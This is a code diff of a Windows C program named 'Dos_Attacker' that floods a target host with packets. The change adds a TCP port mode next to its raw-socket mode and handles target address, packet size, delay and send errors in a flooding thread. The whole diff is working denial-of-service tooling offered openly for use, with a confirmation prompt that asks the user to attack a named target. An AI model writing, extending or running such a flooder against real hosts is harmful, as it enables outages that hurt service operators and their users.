@@ -42,7 +42,7 @@ DWORD WINAPI DoSThread(LPVOID lParam)
 		if (sent <= 0)
 		{
 			res = WSAGetLastError();
-			switch(res)
+			switch (res)
 			{
 			case WSAECONNABORTED:
 				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection.");
@@ -54,7 +54,7 @@ DWORD WINAPI DoSThread(LPVOID lParam)
 				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
 				break;
 			default:
-				printf("\nError \'%u\' has occord.\n", res);
+printf("\nError \'%u\' has occord.\n", res);
 			}
 			exit(-1);
 		}
@@ -131,28 +131,58 @@ DWORD WINAPI SpeedThread(LPVOID lParam)
 	return 0;
 }
 
-int main(int argc,char**argv)
+int main(int argc, char** argv)
 {
-	//Dos_Attacker target_ip service_name package_size delay
+	//Dos_Attacker target_ip /port port OR /raw __nothing__ package_size delay
 
 	BYTE* buff = NULL;
 	SOCKET sock = INVALID_SOCKET;
 	addrinfo victim = { 0 }, * result = NULL;
-	victim.ai_family = AF_UNSPEC;
-	victim.ai_socktype = SOCK_RAW;
-	victim.ai_protocol = IPPROTO_RAW;
 	WSADATA wsa;
 	DWORD delay = 0;
 	size_t pkg_size = 1;
 	HANDLE threads[2];
+	char* port = NULL;
+	bool mode_tcp = true;
 
-	if (argc != 4)
+
+	if (argc < 3)
 	{
 		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
 		return 0;
 	}
 
-	pkg_size = _atoi64(argv[2]);
+	if (strcmp("/port", argv[2]) == 0 || strcmp("-port", argv[2]) == 0 || strcmp("port", argv[2]) == 0)
+	{
+		victim.ai_family = AF_UNSPEC;
+		victim.ai_socktype = SOCK_STREAM;
+		victim.ai_protocol = IPPROTO_TCP;
+		if (argc != 6)
+		{
+			puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+			return 0;
+		}
+	}
+	else if (strcmp("/raw", argv[2]) == 0 || strcmp("-raw", argv[2]) == 0 || strcmp("raw", argv[2]) == 0)
+	{
+		victim.ai_family = AF_UNSPEC;
+		victim.ai_socktype = SOCK_RAW;
+		victim.ai_protocol = IPPROTO_RAW;
+		mode_tcp = false;
+		if (argc != 5)
+		{
+			puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+			return 0;
+		}
+	}
+	else
+	{
+		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+		return 0;
+	}
+
+	if (mode_tcp)port = argv[3];
+	pkg_size = _atoi64(argv[3 + mode_tcp]);
 	if (pkg_size <= 0 || pkg_size > SO_MAX_MSG_SIZE)
 	{
 		printf("Invalid package size.\nPackage size should be less than %u", SO_MAX_MSG_SIZE);
@@ -167,17 +197,17 @@ int main(int argc,char**argv)
 	buff[pkg_size] = 0;
 	for (size_t l = 0; l < pkg_size; l++)
 	{
-		buff[l] = 'h';
+		buff[l] = 'A';
 	}
 
-	delay = atoi(argv[3]);
+	delay = atoi(argv[4 + mode_tcp]);
 
-	printf("You have chose to attack \'%s\' with a package size of %llu and a delay of %llu.\nContinue? ", argv[1], (unsigned long long)pkg_size, (unsigned long long)delay);
+	printf("You have chose to attack \'%s:%s\' with a package size of %llu and a delay of %llu.\nContinue? ", argv[1], (mode_tcp) ? port : "raw", (unsigned long long)pkg_size, (unsigned long long)delay);
 	if (getchar() != 'y')return -1;
 
 	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
 
-	INT res = getaddrinfo(argv[1], NULL, &victim, &result);
+	INT res = getaddrinfo(argv[1], (mode_tcp) ? port : NULL, &victim, &result);
 	if (res)
 	{
 		printf("Error %u in getting address info.\n", res);
